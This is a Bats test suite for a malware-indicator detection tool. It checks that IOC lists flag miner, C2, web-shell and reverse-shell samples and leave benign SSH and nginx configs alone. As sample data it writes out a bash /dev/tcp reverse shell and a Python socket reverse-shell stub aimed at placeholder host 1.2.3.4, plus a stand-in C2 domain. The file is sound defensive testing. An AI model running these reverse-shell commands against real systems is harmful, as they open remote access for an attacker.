#!/usr/bin/env bats
# test_ioc_match.bats — verify IOC files match positive samples
# and reject false-positive samples.

setup() {
    export REPO_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
    export IOC_DIR="$REPO_ROOT/lib/iocs"
    export LIB_DIR="$REPO_ROOT/lib"
}

@test "miner IOC matches xmrig string" {
    [ -f "$IOC_DIR/miners.txt" ]
    echo "PID 1234 /usr/bin/xmrig --config=cfg.json" > /tmp/_fake_proc.txt
    run grep -F -f "$IOC_DIR/miners.txt" /tmp/_fake_proc.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *"xmrig"* ]]
    rm -f /tmp/_fake_proc.txt
}

@test "miner IOC matches miner pool domain" {
    [ -f "$IOC_DIR/miners.txt" ]
    echo "Connecting to pool.minexmr.com:4444" > /tmp/_fake_net.txt
    run grep -F -f "$IOC_DIR/miners.txt" /tmp/_fake_net.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *"pool.minexmr.com"* ]]
    rm -f /tmp/_fake_net.txt
}

@test "rshell IOC catches /dev/tcp/ pattern" {
    [ -f "$IOC_DIR/rshell.txt" ]
    echo "bash -i >& /dev/tcp/1.2.3.4/4444" > /tmp/_fake_rsh.txt
    run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_fake_rsh.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *"/dev/tcp/"* ]]
    rm -f /tmp/_fake_rsh.txt
}

@test "rshell IOC catches python reverse shell" {
    [ -f "$IOC_DIR/rshell.txt" ]
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.2.3.4\",443))'" > /tmp/_fake_pysh.txt
    run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_fake_pysh.txt
    [ "$status" -eq 0 ]
    rm -f /tmp/_fake_pysh.txt
}

@test "c2 IOC catches suspicious .tk domain" {
    [ -f "$IOC_DIR/c2.txt" ]
    echo "Resolved: evil-c2.tk" > /tmp/_fake_dns.txt
    run grep -F -f "$IOC_DIR/c2.txt" /tmp/_fake_dns.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *".tk"* ]]
    rm -f /tmp/_fake_dns.txt
}

@test "backdoors IOC catches b374k.php" {
    [ -f "$IOC_DIR/backdoors.txt" ]
    echo "/var/www/b374k.php" > /tmp/_fake_ws.txt
    run grep -F -f "$IOC_DIR/backdoors.txt" /tmp/_fake_ws.txt
    [ "$status" -eq 0 ]
    [[ "$output" == *"b374k.php"* ]]
    rm -f /tmp/_fake_ws.txt
}

@test "negative: legitimate SSH config does NOT trigger IOC" {
    [ -f "$IOC_DIR/rshell.txt" ]
    cat > /tmp/_legit.txt <<'EOF'
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
EOF
    run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_legit.txt
    [ "$status" -ne 0 ]
    rm -f /tmp/_legit.txt
}

@test "negative: legitimate nginx.conf does NOT trigger IOC" {
    [ -f "$IOC_DIR/rshell.txt" ]
    cat > /tmp/_legit_nginx.txt <<'EOF'
server {
    listen 80;
    server_name example.com;
    location / {
        proxy_pass http://backend;
    }
}
EOF
    run grep -F -f "$IOC_DIR/rshell.txt" /tmp/_legit_nginx.txt
    [ "$status" -ne 0 ]
    rm -f /tmp/_legit_nginx.txt
}

@test "rootkit signatures file exists and is non-empty" {
    [ -f "$LIB_DIR/rootkit_signatures.txt" ]
    [ -s "$LIB_DIR/rootkit_signatures.txt" ]
    # Must contain at least 30 distinct paths (excluding comments)
    count=$(grep -cvE '^\s*$|^\s*#' "$LIB_DIR/rootkit_signatures.txt")
    [ "$count" -ge 30 ]
}

@test "bad_lkm file exists and contains known rootkit modules" {
    [ -f "$LIB_DIR/bad_lkm.txt" ]
    grep -q "^diamorphine$" "$LIB_DIR/bad_lkm.txt"
    grep -q "^suterusu$" "$LIB_DIR/bad_lkm.txt"
    grep -q "^reptile$" "$LIB_DIR/bad_lkm.txt"
}

@test "all 4 IOC files exist and are non-empty" {
    [ -s "$IOC_DIR/miners.txt" ]
    [ -s "$IOC_DIR/c2.txt" ]
    [ -s "$IOC_DIR/backdoors.txt" ]
    [ -s "$IOC_DIR/rshell.txt" ]
}

@test "Maltrail attribution notice exists" {
    [ -f "$IOC_DIR/LICENSE.notice" ]
    grep -q "stamparm/maltrail" "$IOC_DIR/LICENSE.notice"
}